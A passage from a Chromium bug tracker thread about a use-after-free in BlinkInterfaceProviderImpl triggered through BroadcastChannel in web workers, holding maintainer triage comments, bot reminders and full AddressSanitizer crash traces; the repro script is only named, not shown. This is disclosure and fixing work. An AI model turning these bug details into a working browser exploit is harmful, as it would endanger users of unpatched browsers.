  Right alloca redzone:    cb  
==5080==ABORTING  

```

## Attachments

- [UAF_is_valid_Repro.js](attachments/UAF_is_valid_Repro.js) (text/plain, 1.3 KB)

## Timeline

### el...@chromium.org (2016-09-23)

mek@ can you have a look at this? 

I can't tell whether the problem here is in Mojo or BroadcastChannel, and I haven't yet figured out how to get this repro into ClusterFuzz for further automatic analysis.

[Monorail components: Blink>Messaging Internals>Mojo]

### me...@chromium.org (2016-09-23)

Unfortunately I won't be able to take a look at this any time soon. I'm OOO until some time november. But it looks like BlinkInterfaceProviderImpl::getInterface is broken. When called from not the main thread it posts a task to the main thread using a weak pointer created on the not-main thread. I didn't think using weak pointers across threads like that is something that is possible.

### el...@chromium.org (2016-09-24)

Thanks, mek@!

peter@ can you have a look? In https://chromium.googlesource.com/chromium/src/+/f28cb7f78b2f5df0d02ccdfa430edf5e304dfcdd there's mention "it removes usage of WeakPtr" but the CL appears to introduce a WeakPtr?

### sh...@chromium.org (2016-09-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-25)

[Empty comment from Monorail migration]

### bu...@google.com (2016-09-28)

Friendly ping, M54 Stable is coming up and this is marked as a release blocker.

### sh...@chromium.org (2016-10-07)

peter: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### mm...@chromium.org (2016-10-11)

peter@, could you please take a look and re-assign if needed?

### sh...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### bu...@google.com (2016-10-11)

Per #9 moving to M55, Sheriffbot will add back RBS for an medium/high severity issue with the Security_Impact-Beta label.

### sh...@chromium.org (2016-10-21)

peter: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2016-10-26)

**** Bulk edit -  please ignore if not applicable ****

A friendly reminder that M55 Stable is launch is coming soon! Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and get it merged into the release branch ASAP so it gets enough baking time in Beta (before Stable promotion). Thank you!

### go...@chromium.org (2016-10-31)

**** Bulk edit -  please ignore if not applicable ****

A friendly reminder that M55 Stable is launch is coming soon! Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and get it merged into the release branch ASAP so it gets enough baking time in Beta (before Stable promotion). Thank you!



### cl...@chromium.org (2016-11-01)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6123629718011904

### aw...@chromium.org (2016-11-01)

loobenyang@: I've had a go at reproducing, both with clusterfuzz and on directly on Windows 10.0.10586 with the Chrome version specified in the initial report. Is it still reproducing for you?

### lo...@gmail.com (2016-11-02)

How did you covert the test case to clusterfuzz? Looks like Broadcast channel has some restriction on same origin so probably you can not simply convert the text case to a single html file.

Yes, just try with latest official build with the exact same test case UAF_is_valid_Repro.js  and it's reproduced: 



Chromium	56.0.2907.0 (Developer Build) (32-bit)
( https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release%2Fasan-win32-release-429061.zip?generation=1478037988846000&alt=media )

=================================================================
==34308==ERROR: AddressSanitizer: heap-use-after-free on address 0x2b37ce95 at pc 0x1fb222fa bp 0x006fdafc sp 0x006fdaf0
READ of size 1 at 0x2b37ce95 thread T0
==34308==WARNING: Failed to use and restart external symbolizer!
==34308==*** WARNING: Failed to initialize DbgHelp!              ***
==34308==*** Most likely this means that the app is already      ***
==34308==*** using DbgHelp, possibly with incompatible flags.    ***
==34308==*** Due to technical reasons, symbolization might crash ***
==34308==*** or produce wrong results.                           ***
    #0 0x1fb222f9 in rtc::internal::WeakReference::is_valid C:\b\c\b\win_asan_release\src\third_party\webrtc\base\weak_ptr.cc:51
    #1 0x102d5c8c in base::internal::CancellationChecker<base::internal::BindState<void (content::CacheStorageCache::*)(std::unique_ptr<content::CacheStorageCache::PutContext,std::default_delete<content::CacheStorageCache::PutContext> >, int, int) __attribute__((thiscall)),base::WeakPtr<content::CacheStorageCache>,base::internal::PassedWrapper<std::unique_ptr<content::CacheStorageCache::PutContext,std::default_delete<content::CacheStorageCache::PutContext> > >,int>,void>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:407
    #2 0x14cf045a in base::internal::CallbackBase<base::internal::CopyMode::MoveOnly>::IsCancelled C:\b\c\b\win_asan_release\src\base\callback_internal.cc:63
    #3 0x18df4b20 in blink::scheduler::internal::WorkQueue::TakeTaskFromWorkQueue C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\work_queue.cc:112
    #4 0x18dc87e6 in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:318
    #5 0x18dc4db6 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:250
    #6 0x18dcd0b8 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:332
    #7 0x14f701c7 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50
    #8 0x14dc6440 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:413
    #9 0x14dc80bc in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:513
    #10 0x14f79544 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:35
    #11 0x14dc5689 in base::MessageLoop::RunHandler C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:378
    #12 0x14e5b53d in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:35
    #13 0x1c43b471 in content::RendererMain C:\b\c\b\win_asan_release\src\content\renderer\renderer_main.cc:198
    #14 0x14c38097 in content::RunNamedProcessTypeMain C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:408
    #15 0x14c3992f in content::ContentMainRunnerImpl::Run C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:776
    #16 0x14c37be4 in content::ContentMain C:\b\c\b\win_asan_release\src\content\app\content_main.cc:20
    #17 0xfb711ba in ChromeMain C:\b\c\b\win_asan_release\src\chrome\app\chrome_main.cc:97
    #18 0xeca6db in MainDllLoader::Launch C:\b\c\b\win_asan_release\src\chrome\app\main_dll_loader_win.cc:174
    #19 0xec1b1a in main C:\b\c\b\win_asan_release\src\chrome\app\chrome_exe_main_win.cc:247
    #20 0x1321304 in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253
    #21 0x74f338f3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\SYSTEM32\KERNEL32.DLL+0x138f3)
    #22 0x77755de2 in RtlUnicodeStringToInteger+0x252 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65de2)
    #23 0x77755dad in RtlUnicodeStringToInteger+0x21d (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65dad)

0x2b37ce95 is located 5 bytes inside of 8-byte region [0x2b37ce90,0x2b37ce98)
freed by thread T3284 here:
    #0 0x1305878 in free e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44
    #1 0x14d3881e in base::internal::WeakReferenceOwner::GetRef C:\b\c\b\win_asan_release\src\base\memory\weak_ptr.cc:59
    #2 0x1c4b3c2d in base::WeakPtrFactory<content::BlinkInterfaceProviderImpl>::GetWeakPtr C:\b\c\b\win_asan_release\src\base\memory\weak_ptr.h:293
    #3 0x1c4b3733 in content::BlinkInterfaceProviderImpl::getInterface C:\b\c\b\win_asan_release\src\content\renderer\mojo\blink_interface_provider_impl.cc:30
    #4 0x1bb24e89 in blink::InterfaceProvider::getInterface<blink::mojom::blink::BroadcastChannelProvider> C:\b\c\b\win_asan_release\src\third_party\WebKit\public\platform\InterfaceProvider.h:24
    #5 0x1bb23d83 in blink::`anonymous namespace'::getThreadSpecificProvider C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:30
    #6 0x1bb218a2 in blink::BroadcastChannel::BroadcastChannel C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:134
    #7 0x1bb21366 in blink::BroadcastChannel::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:49
    #8 0x1b468a4d in blink::V8BroadcastChannel::constructorCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8BroadcastChannel.cpp:169
    #9 0x1194c45e in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:19
    #10 0x11bfe627 in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:106
    #11 0x11bfc2cd in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:131
    #12 0x11bfb4f8 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:123

previously allocated by thread T3283 here:
    #0 0x130595c in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:65
    #1 0x1fcfdcf8 in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:19
    #2 0x14d387b2 in base::internal::WeakReferenceOwner::GetRef C:\b\c\b\win_asan_release\src\base\memory\weak_ptr.cc:59
    #3 0x1c4b3c2d in base::WeakPtrFactory<content::BlinkInterfaceProviderImpl>::GetWeakPtr C:\b\c\b\win_asan_release\src\base\memory\weak_ptr.h:293
    #4 0x1c4b3733 in content::BlinkInterfaceProviderImpl::getInterface C:\b\c\b\win_asan_release\src\content\renderer\mojo\blink_interface_provider_impl.cc:30
    #5 0x1bb24e89 in blink::InterfaceProvider::getInterface<blink::mojom::blink::BroadcastChannelProvider> C:\b\c\b\win_asan_release\src\third_party\WebKit\public\platform\InterfaceProvider.h:24
    #6 0x1bb23d83 in blink::`anonymous namespace'::getThreadSpecificProvider C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:30
    #7 0x1bb218a2 in blink::BroadcastChannel::BroadcastChannel C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:134
    #8 0x1bb21366 in blink::BroadcastChannel::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\modules\broadcastchannel\BroadcastChannel.cpp:49
    #9 0x1b468a4d in blink::V8BroadcastChannel::constructorCallback C:\b\c\b\win_asan_release\src\out\release\gen\blink\bindings\modules\v8\V8BroadcastChannel.cpp:169
    #10 0x1194c45e in v8::internal::FunctionCallbackArguments::Call C:\b\c\b\win_asan_release\src\v8\src\api-arguments.cc:19
    #11 0x11bfe627 in v8::internal::`anonymous namespace'::HandleApiCallHelper<1> C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:106
    #12 0x11bfc2cd in v8::internal::Builtin_Impl_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:131
    #13 0x11bfb4f8 in v8::internal::Builtin_HandleApiCall C:\b\c\b\win_asan_release\src\v8\src\builtins\builtins-api.cc:123

Thread T3284 created by T0 here:
    #0 0x1310752 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:129
    #1 0x14d3917c in base::PlatformThread::CreateWithPriority C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:193
    #2 0x14e59a36 in base::Thread::StartWithOptions C:\b\c\b\win_asan_release\src\base\threading\thread.cc:112
    #3 0x18bf317b in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:31
    #4 0x18bf2ef8 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:25
    #5 0x18a2c412 in content::BlinkPlatformImpl::createThread C:\b\c\b\win_asan_release\src\content\child\blink_platform_impl.cc:429
    #6 0x1ef8fc3f in blink::WebThreadSupportingGC::WebThreadSupportingGC C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:40
    #7 0x1ef8fae9 in blink::WebThreadSupportingGC::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:18
    #8 0x1b321e61 in blink::WorkerBackingThread::WorkerBackingThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerBackingThread.cpp:49
    #9 0x1b3576f0 in blink::DedicatedWorkerThread::DedicatedWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:60
    #10 0x1b357469 in blink::DedicatedWorkerThread::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:47
    #11 0x1b323f89 in blink::DedicatedWorkerMessagingProxy::createWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerMessagingProxy.cpp:22
    #12 0x1b3581c8 in blink::ThreadedMessagingProxyBase::initializeWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\ThreadedMessagingProxyBase.cpp:57
    #13 0x1b352cf2 in blink::InProcessWorkerMessagingProxy::startWorkerGlobalScope C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\InProcessWorkerMessagingProxy.cpp:133
    #14 0x1b334747 in blink::InProcessWorkerBase::onFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\InProcessWorkerBase.cpp:97
    #15 0x1b35e7a6 in blink::WorkerScriptLoader::notifyFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:228
    #16 0x1b35ffff in blink::WorkerScriptLoader::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:191
    #17 0x1ae9b705 in blink::DocumentThreadableLoader::handleSuccessfulFinish C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:910
    #18 0x1ae98558 in blink::DocumentThreadableLoader::notifyFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:887
    #19 0x1a2026ea in blink::Resource::notifyClientsInternal C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:366
    #20 0x1a2023e5 in blink::Resource::checkNotify C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:355
    #21 0x1a204001 in blink::Resource::finish C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:426
    #22 0x1a1dbc99 in blink::ResourceFetcher::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\ResourceFetcher.cpp:1165
    #23 0x1a239607 in blink::ResourceLoader::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\ResourceLoader.cpp:220
    #24 0x1ee1cc33 in content::WebURLLoaderImpl::Context::OnCompletedRequest C:\b\c\b\win_asan_release\src\content\child\web_url_loader_impl.cc:858
    #25 0x18a98293 in content::ResourceDispatcher::OnRequestComplete C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:440
    #26 0x18a9e780 in IPC::MessageT<ResourceMsg_RequestComplete_Meta,std::tuple<int,content::ResourceRequestCompletionStatus>,void>::Dispatch<content::ResourceDispatcher,content::ResourceDispatcher,void,void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &) __attribute__((thiscall))> C:\b\c\b\win_asan_release\src\ipc\ipc_message_templates.h:120
    #27 0x18a92c68 in content::ResourceDispatcher::DispatchMessageW C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:575
    #28 0x18a91b43 in content::ResourceDispatcher::OnMessageReceived C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:184
    #29 0x1dd14eca in base::internal::Invoker<base::internal::BindState<void (gpu::GpuChannel::*)(const IPC::Message &) __attribute__((thiscall)),base::WeakPtr<gpu::GpuChannel>,IPC::Message>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:340
    #30 0x14f701c7 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50
    #31 0x18dc905c in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:358
    #32 0x18dc4db6 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:250
    #33 0x18dcd0b8 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:332
    #34 0x14f701c7 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50
    #35 0x14dc6440 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:413
    #36 0x14dc80bc in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:513
    #37 0x14f79544 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:35
    #38 0x14dc5689 in base::MessageLoop::RunHandler C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:378
    #39 0x14e5b53d in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:35
    #40 0x1c43b471 in content::RendererMain C:\b\c\b\win_asan_release\src\content\renderer\renderer_main.cc:198
    #41 0x14c38097 in content::RunNamedProcessTypeMain C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:408
    #42 0x14c3992f in content::ContentMainRunnerImpl::Run C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:776
    #43 0x14c37be4 in content::ContentMain C:\b\c\b\win_asan_release\src\content\app\content_main.cc:20
    #44 0xfb711ba in ChromeMain C:\b\c\b\win_asan_release\src\chrome\app\chrome_main.cc:97
    #45 0xeca6db in MainDllLoader::Launch C:\b\c\b\win_asan_release\src\chrome\app\main_dll_loader_win.cc:174
    #46 0xec1b1a in main C:\b\c\b\win_asan_release\src\chrome\app\chrome_exe_main_win.cc:247
    #47 0x1321304 in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253
    #48 0x74f338f3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\SYSTEM32\KERNEL32.DLL+0x138f3)
    #49 0x77755de2 in RtlUnicodeStringToInteger+0x252 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65de2)
    #50 0x77755dad in RtlUnicodeStringToInteger+0x21d (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65dad)

Thread T3283 created by T0 here:
    #0 0x1310752 in __asan_wrap_CreateThread e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_win.cc:129
    #1 0x14d3917c in base::PlatformThread::CreateWithPriority C:\b\c\b\win_asan_release\src\base\threading\platform_thread_win.cc:193
    #2 0x14e59a36 in base::Thread::StartWithOptions C:\b\c\b\win_asan_release\src\base\threading\thread.cc:112
    #3 0x18bf317b in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:31
    #4 0x18bf2ef8 in blink::scheduler::WebThreadImplForWorkerScheduler::WebThreadImplForWorkerScheduler C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\child\webthread_impl_for_worker_scheduler.cc:25
    #5 0x18a2c412 in content::BlinkPlatformImpl::createThread C:\b\c\b\win_asan_release\src\content\child\blink_platform_impl.cc:429
    #6 0x1ef8fc3f in blink::WebThreadSupportingGC::WebThreadSupportingGC C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:40
    #7 0x1ef8fae9 in blink::WebThreadSupportingGC::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\WebThreadSupportingGC.cpp:18
    #8 0x1b321e61 in blink::WorkerBackingThread::WorkerBackingThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerBackingThread.cpp:49
    #9 0x1b3576f0 in blink::DedicatedWorkerThread::DedicatedWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:60
    #10 0x1b357469 in blink::DedicatedWorkerThread::create C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerThread.cpp:47
    #11 0x1b323f89 in blink::DedicatedWorkerMessagingProxy::createWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\DedicatedWorkerMessagingProxy.cpp:22
    #12 0x1b3581c8 in blink::ThreadedMessagingProxyBase::initializeWorkerThread C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\ThreadedMessagingProxyBase.cpp:57
    #13 0x1b352cf2 in blink::InProcessWorkerMessagingProxy::startWorkerGlobalScope C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\InProcessWorkerMessagingProxy.cpp:133
    #14 0x1b334747 in blink::InProcessWorkerBase::onFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\InProcessWorkerBase.cpp:97
    #15 0x1b35e7a6 in blink::WorkerScriptLoader::notifyFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:228
    #16 0x1b35ffff in blink::WorkerScriptLoader::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\workers\WorkerScriptLoader.cpp:191
    #17 0x1ae9b705 in blink::DocumentThreadableLoader::handleSuccessfulFinish C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:910
    #18 0x1ae98558 in blink::DocumentThreadableLoader::notifyFinished C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\loader\DocumentThreadableLoader.cpp:887
    #19 0x1a2026ea in blink::Resource::notifyClientsInternal C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:366
    #20 0x1a2023e5 in blink::Resource::checkNotify C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:355
    #21 0x1a204001 in blink::Resource::finish C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\Resource.cpp:426
    #22 0x1a1dbc99 in blink::ResourceFetcher::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\ResourceFetcher.cpp:1165
    #23 0x1a239607 in blink::ResourceLoader::didFinishLoading C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\core\fetch\ResourceLoader.cpp:220
    #24 0x1ee1cc33 in content::WebURLLoaderImpl::Context::OnCompletedRequest C:\b\c\b\win_asan_release\src\content\child\web_url_loader_impl.cc:858
    #25 0x18a98293 in content::ResourceDispatcher::OnRequestComplete C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:440
    #26 0x18a9e780 in IPC::MessageT<ResourceMsg_RequestComplete_Meta,std::tuple<int,content::ResourceRequestCompletionStatus>,void>::Dispatch<content::ResourceDispatcher,content::ResourceDispatcher,void,void (content::ResourceDispatcher::*)(int, const content::ResourceRequestCompletionStatus &) __attribute__((thiscall))> C:\b\c\b\win_asan_release\src\ipc\ipc_message_templates.h:120
    #27 0x18a92c68 in content::ResourceDispatcher::DispatchMessageW C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:575
    #28 0x18a91b43 in content::ResourceDispatcher::OnMessageReceived C:\b\c\b\win_asan_release\src\content\child\resource_dispatcher.cc:184
    #29 0x1dd14eca in base::internal::Invoker<base::internal::BindState<void (gpu::GpuChannel::*)(const IPC::Message &) __attribute__((thiscall)),base::WeakPtr<gpu::GpuChannel>,IPC::Message>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:340
    #30 0x14f701c7 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50
    #31 0x18dc905c in blink::scheduler::TaskQueueManager::ProcessTaskFromWorkQueue C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:358
    #32 0x18dc4db6 in blink::scheduler::TaskQueueManager::DoWork C:\b\c\b\win_asan_release\src\third_party\WebKit\Source\platform\scheduler\base\task_queue_manager.cc:250
    #33 0x18dcd0b8 in base::internal::Invoker<base::internal::BindState<void (blink::scheduler::TaskQueueManager::*)(base::TimeTicks, bool) __attribute__((thiscall)),base::WeakPtr<blink::scheduler::TaskQueueManager>,base::TimeTicks,bool>,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:332
    #34 0x14f701c7 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50
    #35 0x14dc6440 in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:413
    #36 0x14dc80bc in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:513
    #37 0x14f79544 in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:35
    #38 0x14dc5689 in base::MessageLoop::RunHandler C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:378
    #39 0x14e5b53d in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:35
    #40 0x1c43b471 in content::RendererMain C:\b\c\b\win_asan_release\src\content\renderer\renderer_main.cc:198
    #41 0x14c38097 in content::RunNamedProcessTypeMain C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:408
    #42 0x14c3992f in content::ContentMainRunnerImpl::Run C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:776
    #43 0x14c37be4 in content::ContentMain C:\b\c\b\win_asan_release\src\content\app\content_main.cc:20
    #44 0xfb711ba in ChromeMain C:\b\c\b\win_asan_release\src\chrome\app\chrome_main.cc:97
    #45 0xeca6db in MainDllLoader::Launch C:\b\c\b\win_asan_release\src\chrome\app\main_dll_loader_win.cc:174
    #46 0xec1b1a in main C:\b\c\b\win_asan_release\src\chrome\app\chrome_exe_main_win.cc:247
    #47 0x1321304 in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253
    #48 0x74f338f3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\SYSTEM32\KERNEL32.DLL+0x138f3)
    #49 0x77755de2 in RtlUnicodeStringToInteger+0x252 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65de2)
    #50 0x77755dad in RtlUnicodeStringToInteger+0x21d (C:\WINDOWS\SYSTEM32\ntdll.dll+0x65dad)

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\win_asan_release\src\third_party\webrtc\base\weak_ptr.cc:51 in rtc::internal::WeakReference::is_valid
Shadow bytes around the buggy address:
  0x3566f980: fa fa fd fa fa fa fa fa fa fa fd fd fa fa 00 00
  0x3566f990: fa fa fd fd fa fa fd fd fa fa fd fd fa fa 00 00
  0x3566f9a0: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fa
  0x3566f9b0: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fd
  0x3566f9c0: fa fa fa fa fa fa 00 fa fa fa fd fa fa fa fd fa
=>0x3566f9d0: fa fa[fd]fa fa fa fd fa fa fa fd fd fa fa fd fa
  0x3566f9e0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd
  0x3566f9f0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
  0x3566fa00: fa fa fa fa fa fa fd fa fa fa 00 fa fa fa fd fd
  0x3566fa10: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fa
